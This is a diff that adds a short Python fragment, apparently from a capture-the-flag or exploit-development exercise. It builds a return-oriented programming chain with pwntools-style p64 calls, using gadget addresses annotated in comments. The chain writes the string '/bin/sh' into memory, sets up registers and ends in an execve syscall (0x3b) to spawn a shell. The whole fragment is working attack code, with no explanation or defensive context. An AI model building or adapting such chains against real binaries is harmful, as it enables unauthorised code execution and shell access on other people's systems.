@@ -1,0 +1,29 @@
+payload = p64(0x405d12)
+#0x0000000000405d12: pop rsi; ret; 
+payload += p64(0x415070)+p64(0x4017d3)
+# 0x00000000004017d3: pop rdi; ret; 
+payload += p64(0x68662f6e69622f)+p64(0x40a410)
+# 0x000000000040a410: mov qword ptr [rsi], rdi; ret; 
+payload += p64(0x4017d3)
+# 0x00000000004017d3: pop rdi; ret; 
+payload += p64(0x415070)+p64(0x405d12)
+# 0x0000000000405d12: pop rsi; ret; 
+payload += p64(0x0)+p64(0x406d53)
+# 0x0000000000406d53: xor eax, eax; ret; 
+payload += p64(0x40473d)
+# 0x000000000040473d: mov edx, eax; shr rdx, 0x3f; add rax, rdx; sar rax, 1; jne 0x474d; pop rbp; ret; 
+payload += p64(0x0)+p64(0x4017d2)
+# 0x00000000004017d2: pop r15; ret; 
+payload += p64(0x4049c7)+p64(0x405d11)
+# 0x0000000000405d11: pop r14; ret; 
+payload += p64(0x4049c7)+p64(0x4082b5)
+# 0x4082b5: mov r8d, r15d ; mov dword ptr [rsp], r12d ; call r14
+payload += b''
+# 0x00000000004049c7: pop rbx; pop rbp; ret; 
+payload += p64(0x0)+p64(0x409428)
+# 0x409428: mov eax, dword ptr [rsp + 0x38] ; call r8
+payload += b''
+# 0x00000000004049c7: pop rbx; pop rbp; ret; 
+payload += p64(0x0)+p64(0x404054)
+# 0x0000000000404054: syscall; 
+payload += p64(0x0)+p64(0x0)+p64(0x0)+p64(0x0)+p64(0x0)+p64(0x3b)
